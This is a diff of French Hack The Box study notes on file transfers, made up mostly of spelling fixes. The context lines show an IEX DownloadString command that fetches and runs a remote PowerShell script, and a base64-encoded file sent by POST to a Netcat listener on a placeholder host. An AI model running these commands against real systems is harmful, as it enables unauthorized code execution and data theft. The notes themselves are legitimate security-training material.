@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:30:33.807Z
+date: 2025-03-29T13:32:20.534Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -222,7 +222,6 @@ md5sum <fichier>
 
 ### PowerShell Web Uploads
 
-
 PowerShell ne dispose pas des fonctionnalités d'envoi intégrés.
 Cependant il est possible d'utiliser [Invoke-WebRequest](/Commandes/Windows/PowerShell/Invoke-WebRequest) ou [Invoke-RestMethod](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.5) pour créer cette fonctionnalitée.
 
@@ -230,11 +229,13 @@ De plus, il faut un serveur Web qui supporte les upload.
 [uploadserver](https://github.com/Densaugeo/uploadserver) (une extension du modue http.server) permet cela.
 
 Télécharger le module python:
+
 ```
 pip3 install uploadserver
 ```
 
 Démarrer le serveur web:
+
 ```
 python3 -m uploadserver
 ```
@@ -246,14 +247,16 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 Invoke-FileUpload -Uri http://<adresse>:<portr>/upload -File <fichier>
 ```
 
-Un autre moyen d'envoyer des fichiers est de passer par une requète POST avec le fichier encodé, dans le body de la requète, et d'avoir un listener qui attends la réquète.
+Un autre moyen d'envoyer des fichiers est de passer par une requête POST avec le fichier encodé, dans le body de la requête, et d'avoir un listener qui attends la requête.
 
 Écouter sur le port avec Netcat:
+
 ```
 nc -lvnp <port>
 ```
 
-Effectuer la requète POST avec le fichier encodé dans le body:
+Effectuer la requête POST avec le fichier encodé dans le body:
+
 ```
 $b64 = [System.convert]::ToBase64String((Get-Content -Path '<fichier>' -Encoding Byte))
 Invoke-WebRequest -Uri http://<adresse>:<port>/ -Method POST -Body $b64
@@ -267,16 +270,17 @@ Pour plus d'informations vous pouvez consulter le post Microsoft "[Preventing SM
 Pour contourner cette restriction, il est possible d'utiliser SMB over HTTP avec [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918).
 WebDAV est une extension du protocole HTTP qui permet aux serveurs web de se comporter comme des serveurs de fichiers (supportant la création de contenu collaboratif). WebDAV peut aussi utiliser HTTPS.
 
-Par défaut lors de l'utilisation d'un client SMB, lors d'une tentative de connexion à un partage SMB et si aucun partage SMB n'est disponbile alors le client va essayer de se connecter en utilisant HTTP.
+Par défaut lors de l'utilisation d'un client SMB, lors d'une tentative de connexion à un partage SMB et si aucun partage SMB n'est disponible alors le client va essayer de se connecter en utilisant HTTP.
 
 Pour mettre en place un serveur WebDAV, il faut utiliser les modules python [wsgidav](https://github.com/mar10/wsgidav) et [cheroot](https://pypi.org/project/cheroot/)
 
-Télécharger les modules python nécéssaires:
+Télécharger les modules python nécessaires:
+
 ```
 pip3 install wsgidav cheroot
 ```
 
-Démarrer le serrveur WebDAV sur le port 80 et en écoute sur toutes les adresses et avec une authentification Anonyme:
+Démarrer le serveur WebDAV sur le port 80 et en écoute sur toutes les adresses et avec une authentification Anonyme:
 
 ```
 wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
@@ -289,9 +293,9 @@ dir \\192.168.49.128\DavWWWRoot
 ```
 
 Le mot-clé `DavWWWRoot` est un mot spécial reconnu par Windows.
-Effectivement aucun dossier avec ce nom n'est présent sur le serveur WebDAV. Ce mot clé indique au driver qui gère les requètes WebDAV que la requète concerne la racine du serveur WebDAV.
+Effectivement aucun dossier avec ce nom n'est présent sur le serveur WebDAV. Ce mot clé indique au driver qui gère les requêtes WebDAV que la requête concerne la racine du serveur WebDAV.
 
-Si un dossier spécifique éxiste, alors il est possible de l'entrer à la place de ce mot-clé pour s'y rendre.
+Si un dossier spécifique existe, alors il est possible de l'entrer à la place de ce mot-clé pour s'y rendre.
 
 Pour copier un fichier vers la racine du serveur WebDAV:
 
@@ -331,3 +335,4 @@ echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 
+## Linux File Transfer Methods
